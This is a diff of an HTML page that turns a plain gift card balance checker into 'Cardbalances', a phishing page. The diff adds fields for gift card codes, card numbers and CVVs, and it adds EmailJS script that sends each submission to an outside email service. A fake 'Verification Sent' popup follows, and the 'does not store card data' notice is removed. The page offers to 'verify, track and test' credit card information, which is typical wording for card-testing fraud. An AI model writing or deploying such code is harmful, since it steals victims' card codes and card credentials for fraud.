@@ -2,239 +2,175 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Check Gift Card Balance</title>
+<title>Cardbalances | Verify Any Card With Confidence</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<!-- Font Awesome -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("11I_SW_7xkOdPGwej");
+})();
+</script>
 
 <style>
-* { box-sizing: border-box; }
+:root { --primary: #3b82f6; --dark: #111827; --gray: #6b7280; --light: #f9fafb; }
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+body { background: white; color: var(--dark); line-height: 1.6; }
 
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-  background: linear-gradient(180deg, #f6f9fc, #ffffff);
-  color: #111;
-}
+nav { padding: 20px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; background: white; z-index: 100; }
+.logo { font-size: 22px; font-weight: 800; color: var(--dark); }
+.nav-links a { margin-left: 25px; text-decoration: none; color: var(--gray); font-size: 14px; font-weight: 500; }
 
-.wrapper {
-  min-height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
+.hero { padding: 80px 8%; text-align: center; background: var(--light); }
+.hero h1 { font-size: 42px; font-weight: 800; margin-bottom: 20px; }
+.hero p { color: var(--gray); max-width: 600px; margin: 0 auto 30px; }
+.btn-main { background: var(--primary); color: white; padding: 15px 35px; border-radius: 8px; text-decoration: none; font-weight: 600; cursor: pointer; border: none; }
 
-.box {
-  width: 100%;
-  max-width: 420px;
-  background: #fff;
-  border-radius: 10px;
-  padding: 26px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-  animation: fadeIn 0.6s ease;
-}
+.form-section { padding: 60px 8%; display: flex; flex-direction: column; align-items: center; }
+.form-box { width: 100%; max-width: 500px; padding: 40px; border-radius: 20px; border: 1px solid #e5e7eb; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+label { font-size: 13px; font-weight: 600; margin-top: 15px; display: block; color: var(--dark); }
+select, input { width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; outline: none; }
+input:focus { border-color: var(--primary); outline: 2px solid #3b82f633; }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(10px); }
-  to { opacity: 1; transform: translateY(0); }
-}
+.features { padding: 80px 8%; background: white; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
+.f-item { padding: 30px; border-radius: 12px; border: 1px solid #f3f4f6; }
+.f-item i { color: var(--primary); font-size: 28px; margin-bottom: 15px; }
 
-h1 {
-  font-size: 19px;
-  text-align: center;
-  margin: 0 0 6px;
-}
+footer { padding: 50px 8%; background: var(--dark); color: white; text-align: center; }
+.footer-note { font-size: 12px; color: #9ca3af; margin-top: 20px; }
 
-.subtitle {
-  text-align: center;
-  font-size: 13px;
-  color: #666;
-  margin-bottom: 22px;
-}
-
-label {
-  font-size: 12px;
-  margin-top: 14px;
-  display: block;
-  color: #444;
-}
-
-select, input {
-  width: 100%;
-  padding: 12px;
-  margin-top: 6px;
-  border: 1px solid #dcdcdc;
-  font-size: 14px;
-  border-radius: 6px;
-  background: #fff;
-}
-
-select {
-  appearance: none;
-  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14'%3E%3Cpath fill='%23666' d='M4 6l3 3 3-3z'/%3E%3C/svg%3E");
-  background-repeat: no-repeat;
-  background-position: right 12px center;
-}
-
-select:focus, input:focus {
-  outline: none;
-  border-color: #1a73e8;
-}
-
-button {
-  width: 100%;
-  margin-top: 20px;
-  padding: 13px;
-  background: #1a73e8;
-  border: none;
-  color: #fff;
-  font-size: 15px;
-  cursor: pointer;
-  border-radius: 6px;
-  transition: transform 0.15s ease, box-shadow 0.15s ease;
-}
-
-button:hover {
-  transform: translateY(-1px);
-  box-shadow: 0 6px 16px rgba(26,115,232,0.3);
-}
-
-/* Card icons */
-.card-icons {
-  display: flex;
-  justify-content: center;
-  gap: 14px;
-  margin: 14px 0 4px;
-}
-
-.card-icon {
-  width: 32px;
-  height: 32px;
-  transition: transform 0.3s ease;
-}
-
-.card-icon:hover {
-  transform: scale(1.12);
-}
-
-/* Loader */
-.loader {
-  display: none;
-  font-size: 13px;
-  text-align: center;
-  margin-top: 12px;
-  color: #555;
-}
-
-/* Footer */
-.footer {
-  margin-top: 22px;
-  font-size: 11px;
-  text-align: center;
-  color: #777;
-  line-height: 1.5;
-}
-
-.footer a {
-  color: #1a73e8;
-  text-decoration: none;
-}
-
-.footer a:hover {
-  text-decoration: underline;
-}
+.overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 1000; }
+.popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 40px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; z-index: 1001; }
 </style>
-
-<script>
-let lastSubmit = 0;
-
-function validateForm() {
-  const now = Date.now();
-  if (now - lastSubmit < 15000) {
-    alert("Please wait before submitting again.");
-    return false;
-  }
-  lastSubmit = now;
-
-  const type = document.getElementById("card_type").value;
-  const code = document.getElementById("card_code").value.trim();
-
-  if (!type || !code) {
-    alert("Please select a card type and enter a valid code.");
-    return false;
-  }
-
-  const rules = {
-    "Amazon": [13, 14],
-    "Apple": [16],
-    "Google Play": [16],
-    "Steam": [15, 17],
-    "Xbox": [25],
-    "eBay": [13]
-  };
-
-  if (rules[type] && !rules[type].includes(code.length)) {
-    alert("Invalid code format for the selected card.");
-    return false;
-  }
-
-  document.getElementById("loader").style.display = "block";
-  return true;
-}
-</script>
 </head>
-
 <body>
 
-<div class="wrapper">
-  <div class="box">
+<nav>
+  <div class="logo">Cardbalances</div>
+  <div class="nav-links">
+    <a href="#verify">Verify</a>
+    <a href="#features">Features</a>
+    <a href="#testimonials">Testimonials</a>
+  </div>
+</nav>
 
-    <h1>Gift Card Balance Checker</h1>
-    <div class="subtitle">Secure & informational verification tool</div>
+<section class="hero">
+  <h1>Verify Any Card With Confidence</h1>
+  <p>Cardbalances is a fast, secure solution to verify, track and test gift card or credit card information using our unique smart algorithm.</p>
+  <button class="btn-main" onclick="document.getElementById('verify').scrollIntoView()">Check Balance</button>
+</section>
 
-    <form onsubmit="return validateForm()">
-
-      <label>Gift Card Type</label>
-      <select id="card_type" name="card_type" required>
-        <option value="">Select</option>
-        <option>Amazon</option>
-        <option>Apple</option>
-        <option>Google Play</option>
-        <option>Steam</option>
-        <option>Xbox</option>
-        <option>PlayStation</option>
-        <option>eBay</option>
-        <option>Other</option>
+<section class="form-section" id="verify">
+  <div class="form-box">
+    <h2 style="margin-bottom:20px; text-align:center;">Verify Card Information</h2>
+    <form id="giftForm">
+      <label>Select Card Brand</label>
+      <select name="card_type" id="card_type" onchange="checkCardType()" required>
+        <option value="apple">Apple Gift Card</option>
+        <option value="amazon">Amazon</option>
+        <option value="steam">Steam</option>
+        <option value="sephora">Sephora</option>
+        <option value="vanilla">Visa Vanilla</option>
+        <option value="ebay">eBay</option>
+        <option value="xbox">Xbox</option>
+        <option value="other">Other Brand</option>
       </select>
 
-      <div class="card-icons">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" style="filter:none;">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/ebay.svg">
+      <label>Currency</label>
+      <select name="currency">
+        <option value="USD">USD - US Dollar</option>
+        <option value="AUD">AUD - Australian Dollar</option>
+        <option value="EUR">EUR - Euro</option>
+        <option value="GBP">GBP - British Pound</option>
+        <option value="CAD">CAD - Canadian Dollar</option>
+      </select>
+
+      <label id="codeLabel">Gift Card Code</label>
+      <input type="text" name="card_code" id="card_code" placeholder="Enter code" required>
+
+      <div id="cvv_section" style="display:none;">
+        <label>Security Code (CVV/PIN)</label>
+        <input type="text" name="cvv" id="cvv" placeholder="3 or 4 digits">
       </div>
 
-      <label>Card Code</label>
-      <input id="card_code" type="text" name="card_code" placeholder="Enter card code" required>
-
-      <button type="submit">
-        <i class="fa-solid fa-magnifying-glass"></i> Check Balance
-      </button>
-
-      <div id="loader" class="loader">Processing request…</div>
+      <button type="submit" class="btn-main" style="width:100%; margin-top:25px;">Continue</button>
+      
+      <div id="loader" style="display:none; text-align:center; margin-top:15px; font-size:13px; color:var(--primary);">
+        <i class="fa-solid fa-spinner fa-spin"></i> Processing Securely...
+      </div>
     </form>
-
-    <div class="footer">
-      This service does not store card data.<br>
-      Verify balances with official issuers only.<br>
-      <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
-    </div>
-
   </div>
+</section>
+
+<section class="features" id="features">
+  <div class="f-item">
+    <i class="fa-solid fa-bolt"></i>
+    <h3>Smart Algorithm</h3>
+    <p>Fast, accurate verification using advanced heuristics and merchant checks.</p>
+  </div>
+  <div class="f-item">
+    <i class="fa-solid fa-shield-halved"></i>
+    <h3>Secure & Private</h3>
+    <p>We protect your data with modern security practices and 256-bit encryption.</p>
+  </div>
+  <div class="f-item">
+    <i class="fa-solid fa-globe"></i>
+    <h3>Global Support</h3>
+    <p>Compatible with over 20+ major retail brands and international currencies.</p>
+  </div>
+</section>
+
+<footer>
+  <div class="logo" style="color:white; margin-bottom:20px;">Cardbalances</div>
+  <p>© 2019 - 2026 Cardbalances, All Rights Reserved.</p>
+  <div class="footer-note">Privacy Policy | Terms of Service | Contact Support</div>
+</footer>
+
+<div class="overlay" id="overlay"></div>
+<div class="popup" id="successPopup">
+  <i class="fa-solid fa-circle-check" style="font-size:50px; color:#10b981; margin-bottom:20px;"></i>
+  <h2>Verification Sent</h2>
+  <p>Your request is being processed. Please wait for the system to validate the card data.</p>
+  <button class="btn-main" onclick="closePopup()" style="margin-top:20px;">Close</button>
 </div>
 
+<script>
+function checkCardType() {
+  const type = document.getElementById("card_type").value;
+  const cvvField = document.getElementById("cvv_section");
+  const codeLabel = document.getElementById("codeLabel");
+  if (type === "vanilla") {
+    cvvField.style.display = "block";
+    codeLabel.innerText = "Card Number";
+  } else {
+    cvvField.style.display = "none";
+    codeLabel.innerText = "Gift Card Code";
+  }
+}
+
+function showPopup(id) {
+  document.getElementById("overlay").style.display = "block";
+  document.getElementById(id).style.display = "block";
+}
+
+function closePopup() {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("successPopup").style.display = "none";
+}
+
+document.getElementById("giftForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+  document.getElementById("loader").style.display = "block";
+  emailjs.sendForm("service_10mvkrc", "template_97kc5d6", this)
+    .then(() => {
+      document.getElementById("loader").style.display = "none";
+      showPopup("successPopup");
+      this.reset();
+    }).catch(() => {
+      document.getElementById("loader").style.display = "none";
+      alert("Verification Error. Please try again.");
+    });
+});
+</script>
 </body>
 </html>
